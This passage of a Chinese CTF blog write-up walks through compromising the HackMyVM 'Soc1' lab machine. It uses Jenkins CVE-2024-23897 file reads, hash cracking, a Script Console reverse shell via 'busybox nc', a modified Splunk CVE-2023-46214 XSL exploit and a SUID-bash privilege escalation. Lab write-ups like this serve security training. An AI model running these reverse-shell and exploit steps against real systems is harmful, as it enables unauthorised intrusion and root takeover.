u003c/span\u003e hop                                                                                           \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n                                                         \nTRACEROUTE                                               \nHOP RTT     ADDRESS            \n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.50\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e                                                                                        \n                                                         \nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e52.71\u003c/span\u003e seconds   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开放了多个 Web 服务 (Apache, Splunk, Jenkins) 和一个数据库服务 (MongoDB)\u003c/p\u003e\n\u003ch3\u003e枚举 - web\u003c/h3\u003e\n\u003cp\u003e首先还是看 WEB 服务，但是貌似并没有什么有趣的信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e1l\u003c/span\u003e        3w       16c http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e/\n\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e1l\u003c/span\u003e        3w       16c http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e/index.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举 - Jenkins\u003c/h3\u003e\n\u003cp\u003e8080 端口是 Jenkins，并且可以看到存在 \u003ccode\u003etest\u003c/code\u003e 用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从网上搜索 Jenkins 较新的漏洞，能找到  CVE-2024-23897，是一个任意文件读取漏洞\u003c/p\u003e\n\u003cp\u003e测试漏洞，确认存在任意文件读取漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e存在漏洞后，可以根据这篇文章的思路进行利用： \u003ca href=\"https://blog.csdn.net/qq_34594929/article/details/136446671\"\u003ehttps://blog.csdn.net/qq_34594929/article/details/136446671\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e尝试读取用户文件，提示 \u003ccode\u003eNo such file\u003c/code\u003e，估计默认路径估计被修改了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  CVE-\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23897\u003c/span\u003e git:(main) python CVE-\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23897.\u003c/span\u003epy -t \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e -p \u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e -f \u003cspan class=\"hljs-string\"\u003e'/var/soc/jenkins/users/users.xml'\u003c/span\u003e -c who-am-i\n\nCVE-\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23897\u003c/span\u003e | Jenkins \u0026#x3C;= \u003cspan class=\"hljs-number\"\u003e2.441\u003c/span\u003e \u0026#x26; \u0026#x3C;= LTS \u003cspan class=\"hljs-number\"\u003e2.426\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e PoC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e scanner.\nAlexander Hagenah / @xaitax / ah@primepage.de\u003cspan class=\"hljs-string\"\u003e\"\n\n🔍 Scanning http://192.168.56.137:8080\n💣 Exploit Response from http://192.168.56.137:8080: \n\nERROR: No such file: /var/soc/jenkins/users/users.xml\njava -jar jenkins-cli.jar who-am-i\nReports your credential and permissions.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试读取 \u003ccode\u003eSystemd\u003c/code\u003e 服务单元文件，因为 Linux 系统使用 \u003ccode\u003esystemd\u003c/code\u003e 来管理服务。Jenkins 的服务配置文件会告诉我们它以哪个用户身份运行、环境变量是什么，所以可能会有路径信息\u003c/p\u003e\n\u003cp\u003e推荐使用此项目对漏洞进行利用：  \u003ca href=\"https://github.com/verylazytech/CVE-2024-23897\"\u003ehttps://github.com/verylazytech/CVE-2024-23897\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython CVE-\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23897.\u003c/span\u003epy -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e -f \u003cspan class=\"hljs-string\"\u003e'/etc/systemd/system/jenkins.service'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里获取到类似于 \u003ccode\u003ejenkins\u003c/code\u003e 路径的信息，但还是错误的，提示 \u003ccode\u003eFile does not exist\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随缘测试，测试到 \u003ccode\u003ejenkins\u003c/code\u003e 目录是在 \u003ccode\u003e/var/lib\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eusers.xml\u003c/code\u003e显示系统上的单个用户 \u003ccode\u003etest\u003c/code\u003e，其文件夹为 \u003ccode\u003e/var/lib/jenkins/users/test_3253830066040356536\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e在每一个用户文件中，都包含 \u003ccode\u003econfig.xml\u003c/code\u003e 文件，并且包含密码 HASH\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$2a$\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e$vKk.FDrPqNyv01Nx2QM6Gee0aq\u003cspan class=\"hljs-number\"\u003e.7\u003c/span\u003eHUaCZIIGfODqdShRSQNmVSZCm\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将加密密码通过 hashcat 进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehashcat -m \u003cspan class=\"hljs-number\"\u003e3200\u003c/span\u003e -a \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举 - Splunk\u003c/h3\u003e\n\u003cp\u003e趁密码还在进行破解中，我们再读取一下 Splunk 的配置文件\u003c/p\u003e\n\u003cp\u003e使用常规的安装路径 \u003ccode\u003e/opt/splunk\u003c/code\u003e 进行读取，成功读取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里读取了 \u003ccode\u003e/opt/splunk/etc/passwd\u003c/code\u003e 和 \u003ccode\u003e/etc/system/local/server.conf\u003c/code\u003e 等文件都是返回 \u003ccode\u003eempty\u003c/code\u003e 和\n\u003ccode\u003eFile does not exist\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eSTOP，密码破解出来了...\u003c/p\u003e\n\u003ch3\u003e枚举 - Jenkins - 2\u003c/h3\u003e\n\u003cp\u003e密码破解出来了，是 \u003ccode\u003etest1234\u003c/code\u003e，感觉前面应该再多猜猜的。。。。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eJenkins 后台利用\u003c/h2\u003e\n\u003cp\u003e利用后台进行反弹 shell，找到 \u003ccode\u003eScript Console\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先进行测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eprintln \u003cspan class=\"hljs-string\"\u003e\"cat /etc/passwd\"\u003c/span\u003e.execute().text\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功执行，直接弹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eprintln \u003cspan class=\"hljs-string\"\u003e\"busybox nc 192.168.56.5 1234 -e /bin/bash\"\u003c/span\u003e.execute().text\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能读取 \u003ccode\u003euser.txt\u003c/code\u003e 存在于 splunk 用户家目录中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejenkins@SOC:/home/splunk$ cat user.txt\ncat user.txt\nflag{69cxxxxxxxxxxxxxxxxxxxxxxxxxx}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejenkins@SOC:/$ sudo -l\nsudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jenkins on SOC:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser jenkins may run the following commands on SOC:\n    (ALL) NOPASSWD: /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk search *\n    (ALL) NOPASSWD: /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk restart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里运行需要 splunk 用户的权限\u003c/p\u003e\n\u003cp\u003e翻到 \u003ccode\u003epasswd.old\u003c/code\u003e 中有记录，提示我们 Administrator 的密码可以在 \u003ccode\u003eseclists/Passwords\u003c/code\u003e 中找到，并且给出了 test 用户的账户密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejenkins@SOC:/opt/splunk/etc$ cat passwd.old \nAdministrator passwords can be found under the seclists/Passwords folder.\ngrep -R \u003cspan class=\"hljs-string\"\u003e'splunk'\u003c/span\u003e\ntest:test1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么 Administrator 的密码大概就是如下的其中一个\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e对凭据进行测试（测试命令由 AI 生成，对 Splunk 不熟）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecurl -k -u xxxx:xxxx https://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.137\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8089\u003c/span\u003e/services/apps/local\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后测试得到 \u003ccode\u003esplunk\u003c/code\u003e:\u003ccode\u003esplunk123\u003c/code\u003e 是正确的的凭据，但是不知道得到凭据该如何进行利用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后在 sudo 权限这里死磕了半天，实在没找到什么方法可以进行利用，故放弃\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eCVE-2023-46214\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e随后在 splunk 中搜索可以修改的文件，能找到 \u003ccode\u003eweb.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejenkins@SOC:/opt/splunk$ find . -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f -writable \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n./etc/system/default/web.conf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过搜索引擎能找到一个漏洞是和该文件相关的（PS：图片打错字了，但不影响）\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.freebuf.com/vuls/384743.html\"\u003ehttps://www.freebuf.com/vuls/384743.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e找到一个利用：\u003ca href=\"https://github.com/nathan31337/Splunk-RCE-poc\"\u003ehttps://github.com/nathan31337/Splunk-RCE-poc\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e上边的文章的临时措施是将 \u003ccode\u003eenableSearchJobXslt\u003c/code\u003e 改为 \u003ccode\u003efalse\u003c/code\u003e ，所以我们先把它改成 \u003ccode\u003eTrue\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们的 \u003ccode\u003esudo\u003c/code\u003e 允许我们重启 \u003ccode\u003esplunk\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(ALL) NOPASSWD: /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk restart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后利用 POC，但是没成功。。。。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们查看未修改的 POC，是通过 \u003ccode\u003esh\u003c/code\u003e 来弹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们修改为通过 \u003ccode\u003ebusybox nc\u003c/code\u003e 来弹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e argparse\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e requests\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e json\n\n\u003cspan class=\"hljs-comment\"\u003e# proxies = {\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}\u003c/span\u003e\nproxies = {}\n\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003egenerate_malicious_xsl\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eip, port\u003c/span\u003e):\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003ef\"\"\"\u0026#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u0026#x3C;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:exsl=\"http://exslt.org/common\" extension-element-prefixes=\"exsl\"\u003e\n  \u0026#x3C;xsl:template match=\"/\"\u003e\n    \u0026#x3C;exsl:document href=\"/opt/splunk/bin/scripts/shell.sh\" method=\"text\"\u003e\n        \u0026#x3C;xsl:text\u003ebusybox nc \u003cspan class=\"hljs-subst\"\u003e{ip}\u003c/span\u003e \u003cspan class=\"hljs-subst\"\u003e{port}\u003c/span\u003e -e /bin/bash\u0026#x3C;/xsl:text\u003e\n    \u0026#x3C;/exsl:document\u003e\n  \u0026#x3C;/xsl:template\u003e\n\u0026#x3C;/xsl:stylesheet\u003e\n\"\"\"\u003c/span\u003e\n......\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功接收到 Shell\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e程序劫持\u003c/h3\u003e\n\u003cp\u003e因为我们是 splunk 用户，直接替换掉 splunk，替换为提权的可执行文件，然后通过 Jenkins 用户的 sudo 权限来执行即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Splunk\u003c/span\u003e\nrm /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk\necho \u003cspan class=\"hljs-string\"\u003e\"chmod +s /bin/bash\"\u003c/span\u003e \u003e /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk\nchmod +x /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk\n\u003cspan class=\"hljs-comment\"\u003e# Jenkins\u003c/span\u003e\nsudo /opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/splunk restart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSoc1/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejenkins@SOC:/opt/splunk/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/scripts$ /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash -p\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cat /root/root.txt \u003c/span\u003e\nflag{418dd7b6ffb3xxxxxxxxxxxxxxxxxxxxx2f}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e头痛。。。密码那块我还用 Administrator 作用户名爆破了好久。。\u003c/p\u003e","title":"HackMyVM - Soc1","date":"2025-11-04","updated":"2025-11-04","tags":["HackMyVM","Linux","FUZZ","Jenkins","Splunk","CVE-2023-46214"],"categories":"靶机","comments":true,"description":"Soc1 https://hackmyvm.eu/machines/machine.php?vm=Soc1 Recon PortScan 开放了多个 Web 服务 (Apache, Splunk, Jenkins) 和一个数据库服务 (MongoDB) 枚举 web 首先还是看 WEB 服务，但是貌..."},"recentPosts":[{"id":"群U靶机-Meltdown2","title":"群U靶机 - Meltdown2","date":"2026-05-17","isEncrypted":false,"year":"2026","month":"05","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Machine - Signed","date":"2025-10-14","isEncrypted":false,"year":"2026","month":"05","day":"14"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Machine - Editor","date":"2025-
